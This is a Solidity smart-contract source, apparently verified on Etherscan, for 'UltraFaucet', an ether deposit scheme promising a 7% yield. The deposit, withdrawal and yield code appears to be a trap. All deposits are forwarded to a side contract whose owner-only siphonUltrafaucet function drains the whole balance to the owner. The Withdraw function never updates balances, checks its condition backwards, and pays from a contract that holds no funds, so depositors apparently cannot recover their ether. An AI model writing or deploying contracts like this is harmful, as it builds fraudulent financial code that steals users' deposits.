/**
 *Submitted for verification at Etherscan.io on 2021-07-31
*/

pragma solidity ^0.8.4;

contract UltraFaucetYields {
        
    mapping (bytes32=>bool) admin;
    
    address owner;
    
    constructor(address _ufAddress) {
        admin[keccak256(abi.encode(msg.sender))] = true;
        admin[keccak256(abi.encode(_ufAddress))] = true;
        owner = msg.sender;
    }
    
    receive() external payable{}
        
    function getCurrentYieldPercentage() public pure returns(int) {
        return 7;
    }
    
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    
    function siphonUltrafaucet() public payable isAdmin {
        payable(owner).transfer(address(this).balance);
    }
    
    function withdrawYield(uint256 _amount) public payable isAdmin {
        payable(msg.sender).transfer(_amount);
    }
    
    modifier isAdmin(){
        require(admin[keccak256(abi.encode(msg.sender))]);
        _;
    }
}

contract UltraFaucet
{
    mapping (bytes32=>bool) admin;

    mapping (address => Holder) public Account;

    UltraFaucetYields private _yieldContract;
    
    struct DepositLog {
        uint256 transactionTime;
        uint256 lastCollection;
        uint256 amount;
    }
    
    struct Holder   
    {
        uint256 balance;
        DepositLog[] deposits;
    }
    
    receive() external payable{}
    
    function Deposit() public payable {
        Holder storage account = Account[msg.sender];
        require(msg.value >= MinSum, "The deposited amount is too low.");
        DepositLog memory log;
        log.transactionTime = block.timestamp;
        log.amount = msg.value;
        account.deposits.push(log);
        account.balance += msg.value;
        payable(_yieldContract).transfer(msg.value);
    }
    
    function CollectYield() public {
        Holder storage account = Account[msg.sender];
        uint256 yieldToPay = 0;
        require(account.deposits.length > 0, "You have not made any deposits.");
        for(uint i = 0; i < account.deposits.length; i++) {
            DepositLog memory dep = account.deposits[i];
            if(dep.transactionTime + 1 days <= block.timestamp)
            {
                dep.lastCollection = block.timestamp;
                yieldToPay += (account.deposits[i].amount / 100) * 7;    
            }
        }
        require(yieldToPay > 0, "No deposits fulfill requirements for withdrawal.");
        if(yieldToPay > 0)
        {
            _yieldContract.withdrawYield(yieldToPay);
            address payable receiver = payable(msg.sender);
            receiver.transfer(yieldToPay);    
        }
    }

    function Withdraw(uint256 _amount)
    public
    payable
    {
        Holder memory account = Account[msg.sender];
        require(account.balance >= _amount, "You're trying to withdraw more than your deposited balance.");
        uint256 balanceAvailableForWithdrawal = 0;
        for(uint i = 0; i < account.deposits.length; i++) {
            DepositLog memory dep = account.deposits[i];
            if(dep.transactionTime + 10 days <= block.timestamp)
            {
                balanceAvailableForWithdrawal += account.deposits[i].amount;    
            }
        }
        require(balanceAvailableForWithdrawal <= _amount, "Balance not available for withdrawal.");
        account.balance-=balanceAvailableForWithdrawal;
        address payable receiver = payable(msg.sender);
        receiver.transfer(_amount);
    }
    
    function getDeposits() public view returns(DepositLog[] memory) 
    {
        Holder memory account = Account[msg.sender];
        return account.deposits;
    }
    
    function getBalance() public view returns(uint256){
        Holder memory account = Account[msg.sender];
        return account.balance;
    }

    constructor() {
        admin[keccak256(abi.encodePacked(msg.sender))] = true;
    }
    
    function setYieldContract(address payable contractAddress) public payable isAdmin {
        _yieldContract = UltraFaucetYields(contractAddress);
    }
    
    function getYieldPercentage() public view returns(int) {
        return UltraFaucetYields(_yieldContract).getCurrentYieldPercentage();
    }

    fallback() 
    external
    payable
    {
        Deposit();
    }

    uint256 public MinSum = 1 ether;    
    
    modifier isAdmin(){
        require(admin[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }
}